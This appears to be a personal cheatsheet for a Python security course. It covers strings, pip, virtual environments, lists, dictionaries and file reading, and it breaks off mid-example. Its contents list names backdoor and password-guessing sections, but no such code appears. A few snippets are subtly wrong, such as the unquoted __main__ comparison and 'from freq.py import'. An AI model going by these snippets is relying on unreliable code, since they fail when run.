- [Cheatsheet](#cheatsheet)
  - [573.1 - Essential Skills Workshop](#5731---essential-skills-workshop)
    - [Strings, Bytes and Bytearrays](#strings-bytes-and-bytearrays)
      - [Raw Strings](#raw-strings)
      - [bytes()s](#bytess)
      - [Encoding Characters](#encoding-characters)
      - [Encoding and Decoding Integers](#encoding-and-decoding-integers)
      - [String Methods](#string-methods)
      - [len()](#len)
      - [String Encoders and Decoders](#string-encoders-and-decoders)
    - [Creating and Using Functions](#creating-and-using-functions)
      - [Namespaces](#namespaces)
  - [573.2 - Essential Knowledge Workshop](#5732---essential-knowledge-workshop)
    - [Modules](#modules)
      - [Installing Additional Modules](#installing-additional-modules)
      - [PIP Can Install from many different Sources](#pip-can-install-from-many-different-sources)
      - [Basic PIP Commands](#basic-pip-commands)
      - [Introspection - help(), dir(), type()](#introspection---help-dir-type)
      - [Proper Script Structure](#proper-script-structure)
    - [Virtual Environments](#virtual-environments)
      - [venv Module](#venv-module)
      - [Activating and Using venv](#activating-and-using-venv)
      - [Install Modules in venv](#install-modules-in-venv)
      - [Automatically Activating venv](#automatically-activating-venv)
      - [Executind and Deactivating](#executind-and-deactivating)
    - [Lists](#lists)
      - [List Methods](#list-methods)
      - [Making Copies of Lists](#making-copies-of-lists)
      - [Convert Strings to Lists with .split()](#convert-strings-to-lists-with-split)
      - [Convert Lists to Strings](#convert-lists-to-strings)
      - [Useful functions that work on Lists](#useful-functions-that-work-on-lists)
      - [map()](#map)
      - [Sorting Lists](#sorting-lists)
      - [Sorting Lists - Example](#sorting-lists---example)
    - [For and While Loops](#for-and-while-loops)
      - [enumerate()](#enumerate)
      - [Tuples](#tuples)
    - [Dictionaries](#dictionaries)
      - [Assigning/Retrieving Data from a Dictionary](#assigningretrieving-data-from-a-dictionary)
      - [Copies of Dictionaries](#copies-of-dictionaries)
      - [Common Methods](#common-methods)
      - [Determine if Data is in a Dictionary](#determine-if-data-is-in-a-dictionary)
      - [Looping through Dictionary Items](#looping-through-dictionary-items)
      - [defaultdict()](#defaultdict)
      - [Counter](#counter)
  - [573.3 - Automated Defense](#5733---automated-defense)
    - [File Input/Output Operations](#file-inputoutput-operations)
      - [File Operations](#file-operations)
      - [File Object Methods](#file-object-methods)
      - [Reading Files from the Filesystem](#reading-files-from-the-filesystem)
      - [Write Files to the System](#write-files-to-the-system)
      - [Reading Binary Data from a File](#reading-binary-data-from-a-file)
      - [Working with File Paths](#working-with-file-paths)
      - [Accessing Files with pathlib.Path()](#accessing-files-with-pathlibpath)
      - [Check for Existence of Path](#check-for-existence-of-path)
      - [Obtain a Listing of a Directory 1](#obtain-a-listing-of-a-directory-1)
      - [Obtain a Listing of a Directory 2](#obtain-a-listing-of-a-directory-2)
      - [Files and Subdirectories](#files-and-subdirectories)
      - [Supporting Wildcards with glob](#supporting-wildcards-with-glob)
      - [Finding files with os.walk()](#finding-files-with-oswalk)
      - [os.walk() Example](#oswalk-example)
      - [Reading gzip Compressed Files](#reading-gzip-compressed-files)
    - [Regular Expressions](#regular-expressions)
      - [re functions()](#re-functions)
      - [RegEx Rules 1](#regex-rules-1)
      - [RegEx Rules 2](#regex-rules-2)
      - [Custom Sets](#custom-sets)
      - [Logical OR Statement](#logical-or-statement)
      - [Repeating Chars](#repeating-chars)
      - [RegEx Flags and Modifiers](#regex-flags-and-modifiers)
      - [Greedy Matching](#greedy-matching)
      - [NOT Custom Set](#not-custom-set)
    - [RegEx Groups](#regex-groups)
      - [Why Use Capture Groups](#why-use-capture-groups)
      - [Capture Groups vs. Non Capture Groups](#capture-groups-vs-non-capture-groups)
      - [search() and match() Groups](#search-and-match-groups)
      - [Python Capturing Named Groups](#python-capturing-named-groups)
    - [RegEx Back References](#regex-back-references)
    - [Sets](#sets)
      - [Python Sets](#python-sets)
      - [Useful Methods](#useful-methods)
      - [Operators Automatically Call Methods](#operators-automatically-call-methods)
      - [Making Copies of Sets](#making-copies-of-sets)
    - [Analysis Techniques](#analysis-techniques)
      - [geoip2 IP - Location Lookup](#geoip2-ip---location-lookup)
      - [geoIP2 - Retrieving Record Details 1](#geoip2---retrieving-record-details-1)
      - [geoIP2 - Retrieving Record Details 2](#geoip2---retrieving-record-details-2)
      - [Detecting Randomness by Character Frequency](#detecting-randomness-by-character-frequency)
      - [Build your own Frequency Table](#build-your-own-frequency-table)
    - [Introduction to Scapy](#introduction-to-scapy)
      - [Reading and Writing PacketLists](#reading-and-writing-packetlists)
      - [sniff()'s Callback Functions](#sniffs-callback-functions)
      - [Save Memory with PcapReader](#save-memory-with-pcapreader)
      - [scapy.plist.PacketList](#scapyplistpacketlist)
    - [Scapy Data Structures](#scapy-data-structures)
      - [Following TCP Streams](#following-tcp-streams)
      - [PacketLists have Packets, Packets have Layers](#packetlists-have-packets-packets-have-layers)
      - [Packet Layers have Fields](#packet-layers-have-fields)
    - [Packet Reassembly Issues](#packet-reassembly-issues)
      - [Sorting Packets](#sorting-packets)
      - [Eliminating Duplicate Packages](#eliminating-duplicate-packages)
      - [Eliminating Bad Checksums](#eliminating-bad-checksums)
  - [573.4 - Automated Forensics](#5734---automated-forensics)
    - [The STRUCT Module: Four-Step File-Carving Process](#the-struct-module-four-step-file-carving-process)
      - [Step 1 - Live Hard-Drive Carving](#step-1---live-hard-drive-carving)
      - [Step 1 - Live Memory Carving](#step-1---live-memory-carving)
      - [Step 1 - Windows Live Network Capture](#step-1---windows-live-network-capture)
      - [Step 1 - Linux Live Network Capture](#step-1---linux-live-network-capture)
      - [Step 1 - Analyzing Dead/Static Images](#step-1---analyzing-deadstatic-images)
      - [Step 2 - Understanding the Structure](#step-2---understanding-the-structure)
      - [Step 2 - Third-Party Modules that understand Encapsulated Structures](#step-2---third-party-modules-that-understand-encapsulated-structures)
      - [Step 2 - THe STRUCT Module](#step-2---the-struct-module)
      - [Step 2 - Struckt Unpack](#step-2---struckt-unpack)
      - [Step 2 - Unpacking Bits as Flags](#step-2---unpacking-bits-as-flags)
      - [Step 2 - Struct Pack](#step-2---struct-pack)
      - [Step 2 - Ether Header Struct](#step-2---ether-header-struct)
      - [Step 2 - IP Header Struct](#step-2---ip-header-struct)
      - [Step 2 - TCP Header Struct](#step-2---tcp-header-struct)
      - [Step 2 - UDP Header Struct](#step-2---udp-header-struct)
      - [Step 2 - ICMP Header Struct](#step-2---icmp-header-struct)
      - [Step 3 - Use RegEx on Binary Data](#step-3---use-regex-on-binary-data)
      - [Step 4 - Analyzing the Data](#step-4---analyzing-the-data)
    - [Python Image Library](#python-image-library)
      - [Installing PIL Image Package](#installing-pil-image-package)
      - [Opening Images with PIL](#opening-images-with-pil)
      - [Key Functions in PIL.Image](#key-functions-in-pilimage)
      - [Listing Metadata 1](#listing-metadata-1)
      - [Listing Metadata 2](#listing-metadata-2)
      - [Convert Exif GPS to Decimal Degrees](#convert-exif-gps-to-decimal-degrees)
      - [What to do with GPS Data](#what-to-do-with-gps-data)
    - [Python Database Operations](#python-database-operations)
      - [Python SQL Database Modules](#python-sql-database-modules)
      - [Sqlite3 Connect and Retrieve Table and Column Names](#sqlite3-connect-and-retrieve-table-and-column-names)
      - [Sqlite3 Query the Records from the Database](#sqlite3-query-the-records-from-the-database)
    - [Windows Registry Forensics](#windows-registry-forensics)
      - [The Windows Registry](#the-windows-registry)
      - [Components of Registry](#components-of-registry)
      - [Retrieving one specific Value with .value() or Key with .subkey()](#retrieving-one-specific-value-with-value-or-key-with-subkey)
      - [A list of Values with .values() or Keys with .subkeys()](#a-list-of-values-with-values-or-keys-with-subkeys)
      - [Keys .path() Attribute prints the Keys Path](#keys-path-attribute-prints-the-keys-path)
    - [urllib](#urllib)
      - [Web Encoding in Python3](#web-encoding-in-python3)
      - [GET Requests with urllib](#get-requests-with-urllib)
      - [POST Request with urllib](#post-request-with-urllib)
    - [Requests](#requests)
      - [Requests Module](#requests-module)
      - [One Request at a Time](#one-request-at-a-time)
      - [Response Objects](#response-objects)
      - [Multiple Requests with Sessions](#multiple-requests-with-sessions)
      - [Browser GET/POST Requests](#browser-getpost-requests)
      - [A Password Guesser](#a-password-guesser)
      - [GET/POST Requests Proxies](#getpost-requests-proxies)
      - [GET/POST Requests Cookies](#getpost-requests-cookies)
      - [Access Cookies in the Cookiejar](#access-cookies-in-the-cookiejar)
      - [Example Full Cookie Access](#example-full-cookie-access)
      - [Add Cookies to the Cookiejar](#add-cookies-to-the-cookiejar)
      - [Erase Cookies in the Cookiejar](#erase-cookies-in-the-cookiejar)
      - [GET/POST Request Authentication](#getpost-request-authentication)
      - [Other Auth Types](#other-auth-types)
      - [SSL/TLS Support](#ssltls-support)
      - [Handling Captchas](#handling-captchas)
  - [573.5 - Automated Offense](#5735---automated-offense)
    - [Components of a Backdoor](#components-of-a-backdoor)
      - [Python Backdoor](#python-backdoor)
    - [Socket Communications](#socket-communications)
      - [DNS Queries](#dns-queries)
      - [UDP Sockets](#udp-sockets)
      - [TCP Sockets](#tcp-sockets)
      - [Establish Connections](#establish-connections)
      - [Transmitting and Receiving](#transmitting-and-receiving)
    - [Exception/Error Handling](#exceptionerror-handling)
      - [Exception Handling](#exception-handling)
      - [try/except/else](#tryexceptelse)
      - [Try until it works!](#try-until-it-works)
      - [Try different Things until it works!](#try-different-things-until-it-works)
    - [Process Execution](#process-execution)
      - [Interacting with Subprocesses](#interacting-with-subprocesses)
      - [Capturing Process Execution](#capturing-process-execution)
      - [Popen.wait(), Buffers, and Popen.communicate()](#popenwait-buffers-and-popencommunicate)
      - [A simpler Alternative in .run()](#a-simpler-alternative-in-run)
      - [Shell Command Injection and shell=True](#shell-command-injection-and-shelltrue)
    - [Creating a Python Executable](#creating-a-python-executable)
      - [Turn the .py into an .EXE](#turn-the-py-into-an-exe)
      - [Create an Executable](#create-an-executable)
    - [Techniques for recvall()](#techniques-for-recvall)
      - [Fixed-Byte Recvall()](#fixed-byte-recvall)
      - [Delimiter-Based recvall()](#delimiter-based-recvall)
      - [Non-Blocking Socket](#non-blocking-socket)
      - [Timeout-Based Non-Blocking Socket](#timeout-based-non-blocking-socket)
      - [select.select() Based recvall](#selectselect-based-recvall)
      - [select.select() recvall()](#selectselect-recvall)
    - [stdio](#stdio)
      - [Input, Output, and Error File Descriptors](#input-output-and-error-file-descriptors)
      - [STDIN, STDOUT, STDERR](#stdin-stdout-stderr)
      - [STDOUT, STDIN are File](#stdout-stdin-are-file)
      - [Sockets are similar to Files](#sockets-are-similar-to-files)
      - [os.dup2(src, dest)](#osdup2src-dest)
      - [Replace stdout with a Socket](#replace-stdout-with-a-socket)
    - [OOP](#oop)
      - [Accessing the variable](#accessing-the-variable)
      - [Adding Attributes](#adding-attributes)
      - [Calling the Parent init](#calling-the-parent-init)


---

# Cheatsheet

## 573.1 - Essential Skills Workshop

### Strings, Bytes and Bytearrays

#### Raw Strings

```python
>>> print(r"This has tabs and \t\t multiple\nlines")
This has tabs and \t\t multiple\nlines
# ignores the backslash having any special meaning in a string
```

#### bytes()s

```python
>>> bstr = b"This is a \x62\x79\x74\x65 string \x80\x81"
>>> bstr[0],bstr[1],bstr[2],bstr[3],bstr[4],bstr[5]
(84, 104, 105, 115, 32, 105)
>>> bstr[5:]
b'is a byte string \x80\x81'
# the values in the string are treated as individual bytes and chars are interpreted as ASCII values
```

#### Encoding Characters

```python
>>> "\x41"
'A'
# single byte char
>>> "\u0041"
'A'
# 2-byte char
>>> "\U00000041"
'A'
# 4-byte char
```

#### Encoding and Decoding Integers

```python
>>> chr(65)
'A'
>>> chr(128013)
'🐍'
# chr() converts int to char
>>> ord('A')
65
>>> ord('🐍')
128013
# ord() converts a char into an int
```

#### String Methods

```python
>>> a = "Ah. I see you have the machine that goes 'BING'"
>>> a.upper()
"AH. I SEE YOU HAVE THE MACHINE THAT GOES 'BING'"
# converts to all uppercase
>>> a.title()
"Ah. I See You Have The Machine That Goes 'Bing'"
# capitalizes each word
>>> "bing" in a
False
# looks for substring to exist
>>> "bing" in a.lower()
True
>>> a.replace("BING", "GOOGLE")
"Ah. I see you have the machine that goes 'GOOGLE'"
# replaces words, but variable does not change
>>> a
"Ah. I see you have the machine that goes 'BING'"
>>> a.split()
['Ah.', 'I', 'see', 'you', 'have', 'the', 'machine', 'that', 'goes', "'BING'"]
# splits up into a list, default on whitespace
>>> a.find("machine")
23
# locates one string inside of another and returns the char number at which the string starts
```

#### len()

```python
>>> astring = "THISISASTRING"
>>> len(astring)
13
# returns the length of the string
>>> len(astring) // 2
6
# find middle of a string with floor
>>> alist = ["one",2,3,"four",5]
>>> len(alist)
5
# returns the length of the list
```

#### String Encoders and Decoders

```python
>>> import codecs
>>> codecs.encode("Hello World", "rot13")
'Uryyb Jbeyq'
>>> codecs.encode(b"Hello World", "HEX")
b'48656c6c6f20576f726c64'
>>> codecs.encode("Hello World", "utf-16le")
b'H\x00e\x00l\x00l\x00o\x00 \x00W\x00o\x00r\x00l\x00d\x00'
>>> codecs.encode(b"Hello World", "zip")
b'x\x9c\xf3H\xcd\xc9\xc9W\x08\xcf/\xcaI\x01\x00\x18\x0b\x04\x1d'
>>> codecs.encode(b"Hello World", "base64")
b'SGVsbG8gV29ybGQ=\n'
```

### Creating and Using Functions

#### Namespaces

```python
>>> a=9
>>> globals()['a']
9
>>> globals().items()
dict_items([('__name__', '__main__'), ('__doc__', None), ('__package__', '_pyrepl'), ('__loader__', <_frozen_importlib_external.SourceFileLoader object at 0x7f8f9f667830>), ('__spec__', ModuleSpec(name='_pyrepl.__main__', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f8f9f667830>, origin='/usr/lib/python3.13/_pyrepl/__main__.py')), ('__annotations__', {}), ('__builtins__', <module 'builtins' (built-in)>), ('__file__', '/usr/lib/python3.13/_pyrepl/__main__.py'), ('__cached__', '/usr/lib/python3.13/_pyrepl/__pycache__/__main__.cpython-313.pyc'), ('bstr', b'This is a byte string \x80\x81'), ('a', 9), ('astring', 'THISISASTRING'), ('alist', ['one', 2, 3, 'four', 5]), ('codecs', <module 'codecs' (frozen)>)])
# shows contents of the global namespace
```

## 573.2 - Essential Knowledge Workshop

### Modules

#### Installing Additional Modules

```bash
apt intall python3-pip
```

then:

```bash
curl https://bootstrap.pypa.io/get-pip.py -o get-pip-py
python3 get-pip.py
```

#### PIP Can Install from many different Sources

```bash
pip install git+https://github.com/project
```

#### Basic PIP Commands

```bash
┌──(d41y㉿kali)-[~]
└─$ pip -h                                       

Usage:   
  pip <command> [options]

Commands:
  install                     Install packages.
  lock                        Generate a lock file.
  download                    Download packages.
  uninstall                   Uninstall packages.
  freeze                      Output installed packages in requirements format.
  inspect                     Inspect the python environment.
  list                        List installed packages.
  show                        Show information about installed packages.
  check                       Verify installed packages have compatible dependencies.
  config                      Manage local and global configuration.
  search                      Search PyPI for packages.
  cache                       Inspect and manage pip's wheel cache.
  index                       Inspect information available from package indexes.
  wheel                       Build wheels from your requirements.
  hash                        Compute hashes of package archives.
  completion                  A helper command used for command completion.
  debug                       Show information useful for debugging.
  help                        Show help for commands.
```

#### Introspection - help(), dir(), type()

```python
>>> help(print)

Help on built-in function print in module builtins:

print(*args, sep=' ', end='\n', file=None, flush=False)
    Prints the values to a stream, or to sys.stdout by default.

    sep
      string inserted between values, default a space.
    end
      string appended after the last value, default a newline.
    file
      a file-like object (stream); defaults to the current sys.stdout.
    flush
      whether to forcibly flush the stream.
# inspects the source code of a programm to look for "docstrings" and type hints in it

>>> a = "hello world"
>>> type(a)
<class 'str'>
# tells you what kind of data you are dealing with

>>> dir(a)
['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'removeprefix', 'removesuffix', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
# lists all attributes and methods inside an object
```

#### Proper Script Structure

```bash
#!/usr/bin/python -tt
# You can comment a single line with a pound sign
"""
The first string is the Module DocString and is used by help functions.
"""
import sys
def main():
    "This is a DocString for the main function"
    if not "-u" in sys.argv:
        sys.exit(0)
    print("You passed the argument " + sys.argv[1])

if __name__ == __main__:
    # Global variables go here
    main()
# anytime python is executing a script it sets __name__ to the string "__main__"
# when you import a module in a python interactive session (or in a script), dunder name is assigned the name of the module
# this is to determine if your script is being imported or executed and make it behave differently in each circumstance
```

### Virtual Environments

```python
>>> import sys
>>> sys.path
['', '/usr/lib/python313.zip', '/usr/lib/python3.13', '/usr/lib/python3.13/lib-dynload', '/home/d41y/.local/lib/python3.13/site-packages', '/usr/local/lib/python3.13/dist-packages', '/usr/lib/python3/dist-packages']
# 1. first one is the current dir
# 2. second to excluding site or dist packages are standrad libraries built into python
# -- these are tied to the version of Python and there is only one copy
# -- all venvs share the standard modules
# -- running 'python -Sc import sys;print(sys.path)' will disable extending the path beyond the core standard libraries
# 3. site or dist packages is where pip, apt-get and other package managements install new modules
# -- python package managers such as pip, homebrew, conda, poetry and setup.py will install into the site-package folder
# -- debian based OSes like Ubuntu often install python packages via APT or DPKG instead of pip and those are installed in dist-packages
```

#### venv Module

```bash
┌──(d41y㉿kali)-[~]
└─$ python3 -m venv ~/python-envs/NewApp
# creates a new site modules folder structure with pip and other installed packages
# no existing packages from the default site-package are included
┌──(d41y㉿kali)-[~]
└─$ ls python-envs       
NewApp
```

#### Activating and Using venv

```bash
┌──(d41y㉿kali)-[~]
└─$ source ~/python-envs/NewApp/bin/activate 
# activates the venv
┌──(NewApp)─(d41y㉿kali)-[~]
└─$ which python      
/home/d41y/python-envs/NewApp/bin/python
# changes environment; also changes prompt, showing the environment name to avoid confusion
┌──(NewApp)─(d41y㉿kali)-[~]
└─$ deactivate
# deactivates venv
┌──(d41y㉿kali)-[~]
└─$ which python
/usr/bin/python
```

#### Install Modules in venv

```bash
┌──(d41y㉿kali)-[~]
└─$ source ~/python-envs/NewApp/bin/activate
                                                                                                                    
┌──(NewApp)─(d41y㉿kali)-[~]
└─$ python3 -m pip install requests     
Collecting requests
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting charset-normalizer<4,>=2 (from requests)
  Downloading charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna<4,>=2.5 (from requests)
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests)
  Downloading urllib3-2.4.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests)
  Downloading certifi-2025.4.26-py3-none-any.whl.metadata (2.5 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Downloading charset_normalizer-3.4.2-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (148 kB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Downloading urllib3-2.4.0-py3-none-any.whl (128 kB)
Downloading certifi-2025.4.26-py3-none-any.whl (159 kB)
Installing collected packages: urllib3, idna, charset-normalizer, certifi, requests
Successfully installed certifi-2025.4.26 charset-normalizer-3.4.2 idna-3.10 requests-2.32.3 urllib3-2.4.0
```

#### Automatically Activating venv

```bash
# when apps depend upon a venv...
#!/bin/bash
source ~/path/to/venv/bin/activate
python my_awesome_programm.py
```

#### Executind and Deactivating

```bash
#!/home/student/python-env/573/bin/python
import requests
from freq.py import Freq
# points to the python interpreter in venv, and will be able to find the modules that are part of that venv
```

### Lists

#### List Methods

```python
>>> movies = ["life of brian", "meaning of life"]
>>> movies.index("meaning of life")
1
# finds item in list
>>> movies.insert(1, "holy grail")
# puts at position 1
>>> movies.index("meaning of life")
2
>>> movies.append("free willie")
# add to the end
>>> movies
['life of brian', 'holy grail', 'meaning of life', 'free willie']
>>> movies.remove("free willie")
# removes item
>>> movies
['life of brian', 'holy grail', 'meaning of life']
>>> movies.insert(0, "secret policemans ball")
# adds new element at position zero
>>> movies
['secret policemans ball', 'life of brian', 'holy grail', 'meaning of life']
>>> movies.remove("secret policemans ball")
>>> movies
['life of brian', 'holy grail', 'meaning of life']
>>> movies.reverse()
# reverses the list
>>> movies
['meaning of life', 'holy grail', 'life of brian']
>>> del movies[0]
# removes item (use when item's position is known)
>>> movies
['holy grail', 'life of brian']
```

#### Making Copies of Lists

```python
>>> alist = ["elements", "in a list", 500, 4.299999998]
>>> blist = alist
# makes a pointer, not a copy
>>> blist.append("add this to the list")
>>> blist
['elements', 'in a list', 500, 4.299999998, 'add this to the list']
>>> alist
['elements', 'in a list', 500, 4.299999998, 'add this to the list']
>>> clist = list(alist)
# makes a copy, not a pointer
>>> clist.remove(500)
>>> clist
['elements', 'in a list', 4.299999998, 'add this to the list']
>>> alist
['elements', 'in a list', 500, 4.299999998, 'add this to the list']
```

#### Convert Strings to Lists with .split()

```python
>>> "this is a string converted to a list".split()
['this', 'is', 'a', 'string', 'converted', 'to', 'a', 'list']
>>> "'comma', 'delimited', '1.2'".split(",")
["'comma'", " 'delimited'", " '1.2'"]
>>> "this is a list with is in it".split("is")
['th', ' ', ' a l', 't with ', ' in it']
# no arguments -> splits on white space
# argument given -> splits on that string
```

#### Convert Lists to Strings

```python
>>> " ".join(["SEC573", "is", "awesome!"])
'SEC573 is awesome!'
>>> ",".join(["Make","a","csv"])
'Make,a,csv'
>>> "".join(["SEC573", "is", "awesome!"])
'SEC573isawesome!'
# the string whose method is being called is used as a separator
```

#### Useful functions that work on Lists

```python
>>> sum([2,4,6])
12
# adds all integers
>>> list(zip([1,2],['a','b']))
[(1, 'a'), (2, 'b')]
# groups together items at position 0 from each input list followed by the items at position 1, and so on
>>> list(zip([1,2],['a','b'],[4,5,6]))
[(1, 'a', 4), (2, 'b', 5)]
# only works if there is a value in the given position for each of the feeder lists
```

#### map()

```python
>>> list(map(ord,["A","B","C"]))
[65, 66, 67]
# run function on list
>>> list(map(ord,"ABC"))
[65, 66, 67]
# run function on iterable
>>> def addint(x,y): return int(x)+int(y) 
>>> list(map(addint, [1,'2',3],['4',5,6]))
[5, 7, 9]
# can act as a custom zipper
```

#### Sorting Lists

```python
>>> a = [2,1,4,5,6]
>>> a
[2, 1, 4, 5, 6]
>>> a.sort()
>>> a
[1, 2, 4, 5, 6]
>>> a = [2,1,4,5,6]
>>> a.sort(reverse=True)
>>> a
[6, 5, 4, 2, 1]
```

#### Sorting Lists - Example

```python
>>> customers = ["Mike Passel", "alice Passel", "danielle Clayton"]
>>> sorted(customers)
['Mike Passel', 'alice Passel', 'danielle Clayton']
>>> def lowercase(fullname):
...     return fullname.lower()
...
# creates a function to lowercase the name
>>> sorted(customers, key=lowercase)
['alice Passel', 'danielle Clayton', 'Mike Passel']
>>> def lastfirst(fullname):
...     return (fullname.split() [1] + fullname.split() [0]).lower()
...     
# creates a function for right order and lowercase on interpretation
>>> lastfirst("FNAME LNAME")
'lnamefname'
>>> sorted(customers, key=lastfirst)
['danielle Clayton', 'alice Passel', 'Mike Passel']
```

### For and While Loops

#### enumerate()

```python
>>> movies = ["Life of Brian", "Holy Grail", "Meaning of Life"]
>>> list(enumerate(movies))
[(0, 'Life of Brian'), (1, 'Holy Grail'), (2, 'Meaning of Life')]
>>> for index, value in enumerate(movies):
...     print(f"{value} is in position {index}")
...     
Life of Brian is in position 0
Holy Grail is in position 1
Meaning of Life is in position 2
# enumerate() returns an iterable object that will produce a list of tuples
# first element is the index, second element is the value
```

#### Tuples

```python
>>> movie = ("Meaning of Life", "R")
>>> movie
('Meaning of Life', 'R')
# lightweight lists
# elements cannot be changed
# like sticking multiple variables together into a single variable
```

### Dictionaries

#### Assigning/Retrieving Data from a Dictionary

```python
>>> d = {}
>>> d['a'] = 'alpha'
>>> d['b'] = 'bravo'
>>> d['c'] = 'charlie'
>>> d['d'] = 'delta'
>>> d['a']
'alpha'
>>> d['whatever']
Traceback (most recent call last):
  File "<python-input-11>", line 1, in <module>
    d['whatever']
    ~^^^^^^^^^^^^
KeyError: 'whatever'
# dicts can be accessed like a list with the key as the index
>>> d.get("a", "not found")
'alpha'
>>> d.get("whatever", "not found")
'not found'
# .get() method for retrieving data
```

#### Copies of Dictionaries

```python
>>> dict1 = {1: 'c', 2: 'b', 3:'a'}
>>> dict2 = dict1
>>> dict2
{1: 'c', 2: 'b', 3: 'a'}
>>> dict2[4] = 'd'
>>> dict1
{1: 'c', 2: 'b', 3: 'a', 4: 'd'}
# WRONG
>>> dict1 = {1: 'c', 2: 'b', 3:'a'}
>>> dict2 = dict(dict1)
>>> dict2[4] = 'z'
>>> dict2
{1: 'c', 2: 'b', 3: 'a', 4: 'z'}
>>> dict1
{1: 'c', 2: 'b', 3: 'a'}
# RIGHT
```

#### Common Methods

```python
>>> d
{'a': 'alpha', 'b': 'bravo', 'c': 'charlie', 'd': 'delta'}
>>> d.keys()
dict_keys(['a', 'b', 'c', 'd'])
# returns a view of the keys
>>> d.values()
dict_values(['alpha', 'bravo', 'charlie', 'delta'])
# returns a view of the values
>>> d.items()
dict_items([('a', 'alpha'), ('b', 'bravo'), ('c', 'charlie'), ('d', 'delta')])
# returns a view of tuples containing key and value

# views can be iterated with a for loop like a list
# a variabel assigned to a view will automatically be updated with any changes to the dict
# cannot delete keys while stepping through views
```

#### Determine if Data is in a Dictionary

```python
>>> d
{'a': 'alpha', 'b': 'bravo', 'c': 'charlie', 'd': 'delta'}
>>> d.get("e")
# bad key -> returns nothing
>>> d["e"]
Traceback (most recent call last):
  File "<python-input-32>", line 1, in <module>
    d["e"]
    ~^^^^^
KeyError: 'e'
# bad key -> raises KeyError
>>> "a" in d
True
>>> "alpha" in d
False
# 'in' searches keys
>>> "alpha" in d.values()
True
# to search values use .values()
```

#### Looping through Dictionary Items

```python
>>> d
{'a': 'alpha', 'b': 'bravo', 'c': 'charlie', 'd': 'delta'}
>>> for eachkey, eachvalue in d.items():
...     print(eachkey, eachvalue)
...     
a alpha
b bravo
c charlie
d delta
```

#### defaultdict()

```python
>>> def new_val():
...     return []
...     
>>> from collections import defaultdict
>>> list_of_ips = defaultdict(new_val)
>>> list_of_ips['scr#1'].append('dst')
>>> list_of_ips['scr#2']
[]
>>> list_of_ips
defaultdict(<function new_val at 0x7f03729afce0>, {'scr#1': ['dst'], 'scr#2': []})
# defaultdict() calls the function you specify and returns that value instead of generating a key error
```

#### Counter

```python
>>> from collections import Counter
>>> word_count = Counter()
>>> word_count.update( open("mobydick.txt").read().lower().split())
>>> word_count.most_common(10)
[('the', 7018), ('of', 3500), ('and', 3155), ('a', 2539), ('to', 2375), ('in', 2100), (';', 1949), ('that', 1478), ('his', 1317), ('i', 1185)]
>>> word_count["was"]
852
>>> word_count.update(["was", "is", "was", "am"])
>>> word_count["was"]
854
```

## 573.3 - Automated Defense

### File Input/Output Operations

#### File Operations

```python
>>> filehandle = open("hamlet.txt", "r")
>>> 
>>> with open("hamlet.txt", "r") as file_handle:
...     ...
# using the open() command
```

#### File Object Methods

```python
>>> type(filehandle)
<class '_io.TextIOWrapper'>
>>> dir(filehandle)
['_CHUNK_SIZE', '__class__', '__del__', '__delattr__', '__dict__', '__dir__', '__doc__', '__enter__', '__eq__', '__exit__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__next__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_checkClosed', '_checkReadable', '_checkSeekable', '_checkWritable', '_finalizing', 'buffer', 'close', 'closed', 'detach', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'line_buffering', 'mode', 'name', 'newlines', 'read', 'readable', 'readline', 'readlines', 'reconfigure', 'seek', 'seekable', 'tell', 'truncate', 'writable', 'write', 'write_through', 'writelines']
# seek() sets the file pointer
# tell() returns its current value
# read(), readlines() read the contents of a file as string or list
# write(), writelines() write the contents to a file
# close() closes the file
```

#### Reading Files from the Filesystem

```python
>>> filehandle = open("hamlet_head.txt", "r")
>>> for oneline in filehandle:
...     print(oneline, end = "")
...     
THE TRAGEDY OF HAMLET, PRINCE OF DENMARK


by William Shakespeare



Dramatis Personae

  Claudius, King of Denmark.
>>> filehandle.close()
# iterable object
# can be accessed within a loop
# consumes less memory
>>> filehandle = open("hamlet_head.txt", "r")
>>> listoflines = filehandle.readlines()
>>> filehandle.close()
# reads all of the lines in a file into a list
>>> filehandle = open("hamlet_head.txt", "r")
>>> content = filehandle.read()
>>> filehandle.close()
# reads the entire file into a single string
```

#### Write Files to the System

```python
>>> filehandle = open("hamlet_head.txt", "w")
>>> filehandle.write("Write this one line.\n")
21
>>> filehandle.write("Write these\nTwo Lines.\n")
23
>>> filehandle.close()
# overwrites the content
>>> filehandle = open("hamlet_head.txt", "a")
>>> filehandle.write("add this to the file")
20
>>> filehandle.close()
# appends to the file
```

#### Reading Binary Data from a File

```python
>>> x = open("bash", "rb").read()
>>> x[:20]
b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00>\x00'
# process as bytes()
>>> x = open("bash", encoding="latin-1").read()
